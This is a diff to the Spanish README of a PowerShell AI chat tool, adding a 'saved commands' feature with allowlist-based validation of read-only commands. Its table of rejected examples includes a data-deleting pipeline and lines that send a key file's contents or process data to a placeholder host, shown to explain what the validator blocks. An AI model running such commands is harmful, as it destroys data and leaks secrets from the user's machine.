@@ -35,6 +35,10 @@ que lo genera, y el cliente lo pinta segun llega.
   enlace, DNS, si hay internet), Windows, el procesador, la memoria, los
   discos y la gráfica se leen del propio equipo cuando se pregunta por ellos.
   Ver «Datos de este equipo».
+- **Comandos de solo lectura que guardas tú**: `/comando agregar ip-publica
+  Invoke-RestMethod -Uri https://api.ipify.org` y desde entonces «¿cuál es mi
+  IP pública?» se contesta sola. Unas reglas fijas, no el modelo, deciden si
+  el comando es de solo lectura. Ver «Comandos guardados».
 - **Diagnóstico** con `AI -Check`: estado de clave y conectividad de los
   proveedores sin gastar tokens.
 
@@ -100,7 +104,9 @@ AI "pregunta" -Provider qwen    modelo local mas capaz y mas lento (Qwen3 8B)
 AI "pregunta" -Provider gpt -m gpt-4o -Temp 0.2 -NoStream -Plain
 AI "pregunta" -NoWeb            sin buscar en internet
 AI "pregunta" -NoEquipo         sin leer datos de este equipo
-AI -Check                       diagnostico de los proveedores, internet y el equipo
+AI "pregunta" -NoComandos       sin usar los comandos guardados
+AI -Check                       diagnostico de los proveedores, internet, el equipo
+                                y los comandos guardados
 AI -Help                        ayuda completa
 ```
 
@@ -118,6 +124,11 @@ Dentro del modo interactivo:
 | `/web on|off` | dejar o no que el modelo busque solo |
 | `/equipo [X]`  | enseñar los datos de este equipo sin preguntar al modelo (X: `bateria`, `red`, `equipo`, `sistema`, `procesador`, `memoria`, `disco`, `grafica`) |
 | `/equipo on|off` | dejar o no que se lean los datos de este equipo al preguntar |
+| `/comando agregar N C` | revisar el comando `C` y guardarlo con el nombre `N` |
+| `/comando`     | lista de los comandos guardados |
+| `/comando N`   | ejecutar el comando guardado `N` y enseñar su salida, sin modelo |
+| `/comando quitar N` | borrarlo |
+| `/comando on|off` | dejar o no que el modelo use los comandos guardados |
 | `/help`        | mostrar la ayuda                |
 
 Sin configurar nada, el proveedor es `xai`: hace falta `XAI_API_KEY`, o elegir
@@ -138,8 +149,9 @@ El `model` de `settings.json` va con su `provider`: si eliges otro proveedor
 con `-Provider` o `AI_PROVIDER`, se usa el modelo por defecto de ese proveedor.
 Para que un modelo local sea el de por defecto: `{ "provider": "qwen" }`.
 
-En el mismo fichero, `"web": false` apaga la búsqueda en internet y
-`"equipo": false` la lectura de los datos de este equipo.
+En el mismo fichero, `"web": false` apaga la búsqueda en internet,
+`"equipo": false` la lectura de los datos de este equipo y `"comandos": false`
+el uso de los comandos guardados.
 
 ## Proveedores soportados
 
@@ -337,8 +349,9 @@ Lo que conviene saber:
   laptop gamer?» no son de este equipo: no se lee nada y se buscan en
   internet como siempre. «¿Qué es una dirección IP?» la explica el modelo.
 - **Si no pudo leer un dato, lo dice** y no pone ninguno en su lugar. La IP
-  pública (la que ven los sitios de internet) no se puede leer desde el
-  equipo, y también lo dice.
+  pública (la que ven los sitios de internet) no está en el equipo, y también
+  lo dice; para tenerla hay que preguntársela a un servidor de fuera, y eso
+  se hace guardando un comando (ver «Comandos guardados»).
 - **Sin modelo**: `/equipo` enseña en pantalla todo lo leído, y `/equipo red`
   o `/equipo disco memoria` solo esa parte. Funciona sin servidor y sin
   internet.
@@ -356,6 +369,146 @@ Lo que conviene saber:
   reconoce se contesta con un «no puedo saberlo». La hora en otra ciudad no
   sale del reloj: el modelo la busca en internet si hay conexión.
 
+## Comandos guardados
+
+Hay datos que `AI` no trae de serie pero que un comando de PowerShell da en
+una línea: la IP pública, los procesos que más procesador han gastado, si el
+antivirus está activo. Se guardan desde el propio chat, con un nombre, y
+desde entonces el modelo puede pedirlos por ese nombre.
+
+```
+Ariel > /comando agregar ip-publica Invoke-RestMethod -Uri https://api.ipify.org
+
+  comando:  Invoke-RestMethod -Uri https://api.ipify.org
+  reglas:   pasa (Invoke-RestMethod)
+  red:      sale a internet, a api.ipify.org (https, solo lee)
+  modelo, con la documentacion de Microsoft a la vista:
+    Este comando realiza una solicitud HTTP a la API de ipify.org. Lee la
+    dirección IP pública del equipo desde esa API. No envía datos ni modifica
+    nada en el equipo local.
+
+  para que sirve? (una frase; el modelo la lee para saber cuando usarlo) > mi IP publica
+  lo guardo? (s/n) > s
+guardado como «ip-publica». Primera ejecucion:
+203.0.113.7
+
+Ariel > ¿cuál es mi IP pública?
+ia > ejecutando el comando guardado: ip-publica
+ia > Tu IP pública es 203.0.113.7.
+```
+
+### Quién decide si un comando vale
+
+**Unas reglas fijas, no el modelo.** El modelo explica el comando (con el
+principio de la documentación de Microsoft a la vista, si hay conexión) y
+avisa si ve algo raro, pero no aprueba nada: un modelo se equivoca, y una
+página que dice «este comando es seguro» es texto de fuera. Al final confirmas
+tú, viendo el comando exacto y a qué servidor sale.
+
+Las reglas (`Get-AIComandoPlan`, en `lib/comandos.ps1`):
+
+1. **El comando lo tecleas tú** tras `/comando agregar`, en el modo
+   interactivo. Lo que escribe el modelo o trae una página no puede agregar
+   nada.
+2. **Se analiza con el analizador del propio PowerShell**, no con expresiones
+   regulares. Tiene que ser una sola canalización de comandos con argumentos
+   fijos. Se rechazan las variables, las cadenas con sustitución, los
+   paréntesis, los bloques `{ }`, las llamadas a métodos, los tipos `[..]`,
+   las redirecciones, los comentarios y `;`, `&`, `.`.
+3. **Cada comando tiene que estar en una lista cerrada**, por su nombre
+   completo (los alias no valen: `irm` no, `Invoke-RestMethod` sí) y venir de
+   un módulo de la carpeta de Windows. Un programa solo vale si está en
+   `System32`, lo firma Microsoft y sus argumentos casan con una forma
+   permitida: `ipconfig /all` sí, `ipconfig /release` no.
+4. **Cada parámetro tiene que estar en la lista de ese comando.** Las
+   abreviaturas (`-OutF`) y los argumentos sin nombre los resuelve el
+   enlazador de PowerShell antes de comparar.
+5. **Lo que sale a internet**: solo `https`, dirección escrita fija, servidor
+   público (nunca `192.168.x.x`, `localhost` ni nombres de la red de casa),
+   solo lectura (`GET`), sin seguir redirecciones y solo como primer comando.
+   Al no recibir nada por la canalización, no puede sacar datos del equipo.
+
+Lo que pasa y lo que no:
+
+| Comando | Resultado |
+| --- | --- |
+| `Invoke-RestMethod -Uri https://api.ipify.org` | Pasa; avisa de que sale a internet, a api.ipify.org |
+| `Get-Process \| Sort-Object CPU -Descending \| Select-Object -First 5 Name, CPU` | Pasa |
+| `Get-MpComputerStatus \| Select-Object AntivirusEnabled` | Pasa |
+| `ipconfig /all \| Select-String DNS` | Pasa |
+| `ipconfig /release` | No: no es una forma de solo lectura de `ipconfig` |
+| `Get-ChildItem C:\ \| Remove-Item` | No: no están en la lista |
+| `Get-Process \| ForEach-Object Kill` | No: `ForEach-Object` llamaría a un método de cada objeto |
+| `Invoke-RestMethod "https://x.com/?d=$(Get-Content clave.txt)"` | No: la dirección no es fija |
+| `Get-Process \| Invoke-RestMethod -Uri https://x.com -Method Post` | No: lo que sale a internet solo puede ir el primero |
+| `Invoke-WebRequest -Uri http://192.168.0.1/reboot` | No: ni `https` ni servidor público |
+| `.\mi-script.ps1`, `C:\Herramientas\x.exe`, `powershell -Command ...` | No: ni scripts ni programas de fuera de Windows |
+
+### Qué hay en la lista
+
+- **Producen datos** (solo como primer comando): `Get-Date`, `Get-Culture`,
+  `Get-TimeZone`, `Get-ComputerInfo`, `Get-Process`, `Get-Service`,
+  `Get-HotFix`, `Get-PSDrive`, `Get-CimInstance`, `Get-NetAdapter`,
+  `Get-NetIPAddress`, `Get-NetIPConfiguration`, `Get-NetRoute`,
+  `Get-NetConnectionProfile`, `Get-NetFirewallProfile`,
+  `Get-DnsClientServerAddress`, `Get-Volume`, `Get-Disk`, `Get-PhysicalDisk`,
+  `Get-Partition`, `Get-PnpDevice`, `Get-Printer`, `Get-MpComputerStatus`,
+  `Resolve-DnsName`, `Test-Connection`, `Test-NetConnection`,
+  `Invoke-RestMethod`, `Invoke-WebRequest`.
+- **Ordenan, eligen o dan formato** (solo detrás de otro): `Select-Object`,
+  `Where-Object` (en su forma `Where-Object Status -eq Running`),
+  `Sort-Object`, `Measure-Object`, `Group-Object`, `Format-List`,
+  `Format-Table`, `Select-String`, `ConvertTo-Json`, `ConvertFrom-Json`,
+  `ConvertTo-Csv`, `Out-String`.
+- **Programas de System32**, con sus formas de solo lectura: `ipconfig`,
+  `hostname`, `whoami`, `systeminfo`, `getmac`, `arp -a`, `route print`,
+  `tasklist`, `driverquery`, `powercfg /list`, `netsh wlan show ...`,
+  `netsh interface ... show ...`, `ping`, `nslookup`.
+- **Fuera a propósito**: lo que lee ficheros, el registro, el portapapeles o
+  los registros de sucesos (`Get-Content`, `Get-ChildItem`, `Get-ItemProperty`,
+  `Get-Clipboard`, `Get-WinEvent`), porque lo leído viaja al modelo; y todo lo
+  que escribe o cambia algo.
+
+La lista y los parámetros de cada comando están en `$AI_CMD_CMDLETS` y
+`$AI_CMD_EXES`, al principio de `lib/comandos.ps1`. Ampliarla es añadir una
+entrada ahí.
+
+### Cómo se ejecuta
+
+- **El texto no se ejecuta nunca.** De la validación sale un plan (cada
+  comando con su módulo, sus parámetros ya resueltos y sus valores) y lo que
+  corre es ese plan, pieza a pieza. No hay diferencia posible entre lo que se
+  revisó y lo que se ejecuta.
+- **Cada ejecución vuelve a pasar las reglas.** Un `comandos.json` cambiado a
+  mano por algo que no las pasa no se ejecuta: dice «ya no pasa las reglas».
+- **Con plazo y tope**: 15 segundos y 4.000 caracteres de salida.
+- **Con los permisos de la consola.** Nunca pide permisos de administrador.
+- **El modelo pide por nombre.** La herramienta `comando_guardado` solo acepta
+  un nombre de la lista; el modelo no puede escribir un comando. Si la
+  pregunta lleva las palabras del nombre («ip pública» para `ip-publica`), se
+  ejecuta sin esperar a que el modelo lo pida, y así sirve también con
+  `gemma3`. `/comando ip-publica` lo ejecuta sin modelo.
+- **La salida entra como dato**, rotulada con el servidor del que viene. Tras
+  ejecutar un comando guardado no se ofrecen más herramientas en ese turno,
+  para que una respuesta de fuera no pueda encadenar otra acción.
+
+### Límites
+
+- **Solo lectura no es lo mismo que privado.** La salida viaja al proveedor
+  del modelo junto a la pregunta; con uno en la nube (OpenAI, xAI), sale del
+  equipo.
+- **De un servidor ajeno solo se sabe a cuál se llama**, no qué hace con la
+  visita. Por eso lo ves y lo confirmas tú.
+- **La lista es corta y rechazará comandos legítimos.** Es a propósito: se
+  amplía a mano.
+- **El modelo puede leer mal una salida.** A la columna `CPU` de
+  `Get-Process`, que son segundos de procesador, Gemma 4 E4B le puso un signo
+  de porcentaje; ahora se le pide que no añada unidades que la salida no
+  diga, pero una salida clara ayuda (`Select-Object` con pocos campos).
+- **Hasta 20 comandos**, guardados en
+  `%LOCALAPPDATA%\PRC-CMD-AI\comandos.json`. Se apagan con `-NoComandos`,
+  `/comando off` o `"comandos": false` en `settings.json`.
+
 ## Estructura del código
 
 ```
@@ -372,6 +525,9 @@ lib/web.ps1         buscar en internet: hay salida?, DuckDuckGo, lectura de
 lib/equipo.ps1      lo que el equipo ya sabe: el reloj, las ocho lecturas
                     (bateria, red, Windows, hardware), el atajo y la
                     herramienta datos_equipo
+lib/comandos.ps1    comandos de solo lectura que guarda el usuario: las
+                    reglas (analizador de PowerShell y listas cerradas), la
+                    ejecucion por piezas y la herramienta comando_guardado
 tools/Set-AIKey.ps1 guardado seguro de claves en HKCU\Environment
 tools/build.ps1     normaliza codificacion: UTF-8 con BOM en .ps1, CRLF en .bat
 ```
@@ -385,8 +541,8 @@ parsea).
 
 - Pensado para Windows; no se ha probado en PowerShell para Linux/macOS.
 - Sin soporte de imágenes ni ficheros adjuntos más allá del contexto por
-  stdin / `-Context`. Las únicas herramientas son `buscar_web` y
-  `datos_equipo`.
+  stdin / `-Context`. Las únicas herramientas son `buscar_web`,
+  `datos_equipo` y `comando_guardado`.
 - El coste de la memoria del REPL crece con la conversación (se envía entera
   en cada turno): usa `/new` en conversaciones largas.
 
